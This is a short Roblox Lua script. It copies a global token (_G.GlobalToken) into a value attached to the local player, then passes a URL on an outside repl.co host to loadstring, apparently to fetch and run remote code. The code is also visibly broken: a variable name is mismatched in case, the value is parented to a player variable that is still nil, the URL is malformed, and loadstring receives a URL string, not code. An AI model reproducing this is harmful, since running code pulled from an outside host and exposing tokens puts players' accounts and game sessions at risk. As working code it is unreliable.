repeat wait() until game.Players.LocalPlayer --Wait until player loaded

--Locals
local sa_Instance
local player
local ip

--Assign
sa_instance = Instance.new("StringValue")
sa_instance.Value = _G.GlobalToken
sa_instance.Parent = player
player = game.Players.LocalPlayer
ip = "https://.starvdog.repl.co"

--Connect
loadstring(ip)
